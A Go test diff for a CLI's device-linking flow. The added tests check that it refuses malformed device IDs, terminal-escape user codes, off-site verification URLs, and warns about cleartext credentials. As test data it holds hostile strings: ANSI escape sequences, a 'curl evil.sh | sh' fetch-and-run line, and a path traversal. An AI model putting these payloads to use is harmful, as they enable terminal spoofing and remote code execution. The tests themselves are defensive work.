@@ -48,6 +48,11 @@ type fakeApp struct {
 	startBody   string
 	tokenStatus int
 	tokenBody   string
+	// userCode and verificationURL override what the grant carries, for the
+	// hostile-string paths; relayURL overrides what the mint names.
+	userCode        string
+	verificationURL string
+	relayURL        string
 }
 
 func newFakeApp(t *testing.T) *fakeApp {
@@ -88,14 +93,21 @@ func (f *fakeApp) serve(w http.ResponseWriter, r *http.Request) {
 			write(f.startStatus, f.startBody)
 			return
 		}
+		userCode, verify := f.userCode, f.verificationURL
+		if userCode == "" {
+			userCode = "BCDF-GHJK"
+		}
+		if verify == "" {
+			verify = f.origin() + "/enroll"
+		}
 		write(http.StatusOK, fmt.Sprintf(`{
-			"userCode":"BCDF-GHJK",
+			"userCode":%q,
 			"deviceCode":%q,
 			"verificationUrl":%q,
 			"verificationUrlComplete":%q,
 			"expiresIn":600,
 			"interval":5
-		}`, linkDeviceCode, f.origin()+"/enroll", f.origin()+"/enroll?code=BCDF-GHJK"))
+		}`, userCode, linkDeviceCode, verify, verify+"?code=BCDF-GHJK"))
 
 	case controlplane.PollDeviceAuthPath():
 		body := `{"status":"pending"}`
@@ -112,8 +124,12 @@ func (f *fakeApp) serve(w http.ResponseWriter, r *http.Request) {
 			write(f.tokenStatus, f.tokenBody)
 			return
 		}
+		relayURL := f.relayURL
+		if relayURL == "" {
+			relayURL = "wss://relay.flue.sh"
+		}
 		write(http.StatusOK, fmt.Sprintf(
-			`{"token":%q,"relayUrl":"wss://relay.flue.sh","expiresIn":300}`, linkChannelToken))
+			`{"token":%q,"relayUrl":%q,"expiresIn":300}`, linkChannelToken, relayURL))
 
 	default:
 		http.Error(w, "not found", http.StatusNotFound)
@@ -571,6 +587,137 @@ func TestLinkSettlesOnOneSpellingOfTheOrigin(t *testing.T) {
 	}
 	if rc.ControlPlane != f.origin() {
 		t.Errorf("ControlPlane = %q, want %q", rc.ControlPlane, f.origin())
+	}
+}
+
+// TestLinkRefusesADeviceIDThatIsNotOne.
+//
+// A device id is hex(sha256(publicKey))[:12] on both sides, so it has exactly
+// one shape — and this string is the one from the flow that outlives the
+// command. It is printed, written into relay.json, and sent as a parameter of
+// every token this machine ever mints. A control plane that names a machine
+// with a terminal escape, a path, or a kilobyte of anything is not one to keep
+// strings from, so the link stops rather than storing it.
+func TestLinkRefusesADeviceIDThatIsNotOne(t *testing.T) {
+	for _, id := range []string{
+		"abc123abc12\x1b[2K\rroot@host $ ", // repaints the line it was printed on
+		"ABC123ABC123",                     // uppercase is not what either side derives
+		"abc123abc1234",                    // too long
+		"../../../etc",                     // right length, wrong everything
+		"",
+	} {
+		t.Run(id, func(t *testing.T) {
+			t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+			f := newFakeApp(t)
+			f.polls = []string{approved(id)}
+
+			var out bytes.Buffer
+			err := runLink(context.Background(), &out, newTestLinker(f, "l"))
+			if err == nil {
+				t.Fatal("a malformed device id was accepted as an enrolment")
+			}
+			if id != "" && strings.Contains(out.String(), id) {
+				t.Errorf("the device id reached the terminal:\n%q", out.String())
+			}
+			if strings.ContainsAny(out.String()+err.Error(), "\x1b\r") {
+				t.Errorf("a terminal escape reached the transcript:\n%q\n%q", out.String(), err.Error())
+			}
+			if _, ok, _ := config.LoadRelay(); ok {
+				t.Error("relay.json was written with a device id that is not one")
+			}
+		})
+	}
+}
+
+// TestLinkRefusesAGrantItCannotSafelyPrint.
+//
+// The user code and the verification URL are chosen by whatever answered the
+// start call and printed into a live terminal with no escaping — so a control
+// plane that has been compromised, or a host impersonating one, gets to write
+// bytes an emulator acts on rather than draws. The URL has a second job: it is
+// where the operator is *sent* to approve this machine, and the app derives it
+// from the request's own origin, so anywhere else is somebody redirecting an
+// approval.
+func TestLinkRefusesAGrantItCannotSafelyPrint(t *testing.T) {
+	const payload = "\x1b]0;pwned\a\rrun: curl evil.sh | sh"
+	for _, tc := range []struct {
+		name              string
+		userCode, verify  string
+		mustNotBePrinted  string
+		errorMustNotQuote string
+	}{
+		{name: "a user code that repaints the terminal", userCode: "BCDF" + payload, mustNotBePrinted: payload, errorMustNotQuote: payload},
+		{name: "a user code nobody could type", userCode: strings.Repeat("B", 400), mustNotBePrinted: strings.Repeat("B", 400)},
+		{name: "a verification page on another site", verify: "https://flue-sh.example.com/enroll", mustNotBePrinted: "flue-sh.example.com"},
+		{name: "a verification page that is not a URL", verify: "not a url at all", mustNotBePrinted: "not a url at all"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+			f := newFakeApp(t)
+			f.userCode, f.verificationURL = tc.userCode, tc.verify
+			f.polls = []string{approved("abc123abc123")}
+
+			var out bytes.Buffer
+			err := runLink(context.Background(), &out, newTestLinker(f, "l"))
+			if err == nil {
+				t.Fatal("the grant was printed and followed")
+			}
+			if strings.Contains(out.String(), tc.mustNotBePrinted) {
+				t.Errorf("the transcript carries the control plane's string:\n%q", out.String())
+			}
+			// The error is printed too, so refusing by quoting what arrived
+			// would be the same hole with an apology in front of it.
+			if tc.errorMustNotQuote != "" && strings.Contains(err.Error(), tc.errorMustNotQuote) {
+				t.Errorf("the refusal quotes what it refused: %q", err.Error())
+			}
+			if _, ok, _ := config.LoadRelay(); ok {
+				t.Error("relay.json was written for a grant that was never shown")
+			}
+		})
+	}
+}
+
+// TestLinkSaysWhenACredentialWillTravelInCleartext.
+//
+// http:// and ws:// are accepted on purpose — `vite dev` and a local relay are
+// how this flow gets developed — but the poll that approves a machine carries
+// its permanent enrollment token back over the control-plane connection, and
+// every dial presents a channel token over the relay one. Off loopback that is
+// both credentials in plaintext to everyone on the path, and the only moment
+// anybody is looking is this one.
+func TestLinkSaysWhenACredentialWillTravelInCleartext(t *testing.T) {
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	f := newFakeApp(t) // httptest serves http://
+	f.polls = []string{approved("abc123abc123")}
+	f.relayURL = "ws://127.0.0.1:8787"
+
+	var out bytes.Buffer
+	if err := runLink(context.Background(), &out, newTestLinker(f, "l")); err != nil {
+		t.Fatalf("runLink: %v", err)
+	}
+	if got := strings.Count(out.String(), "cleartext"); got != 2 {
+		t.Errorf("warned %d times, want one for the control plane and one for the relay:\n%s", got, out.String())
+	}
+}
+
+// TestLinkSaysNothingAboutCleartextWhenThereIsNone: the deployed relay is wss://
+// and a warning printed on the ordinary path is a warning nobody reads.
+func TestLinkSaysNothingAboutCleartextWhenThereIsNone(t *testing.T) {
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	f := newFakeApp(t)
+	f.polls = []string{approved("abc123abc123")}
+
+	var out bytes.Buffer
+	if err := runLink(context.Background(), &out, newTestLinker(f, "l")); err != nil {
+		t.Fatalf("runLink: %v", err)
+	}
+	// The control plane here is httptest's http://, so exactly one warning —
+	// and it is not the relay's, which is wss://.
+	if got := strings.Count(out.String(), "cleartext"); got != 1 {
+		t.Errorf("warned %d times about a wss:// relay, want 1 (the http control plane only):\n%s", got, out.String())
+	}
+	if strings.Contains(out.String(), "the relay (") {
+		t.Errorf("a wss:// relay was called cleartext:\n%s", out.String())
 	}
 }
 
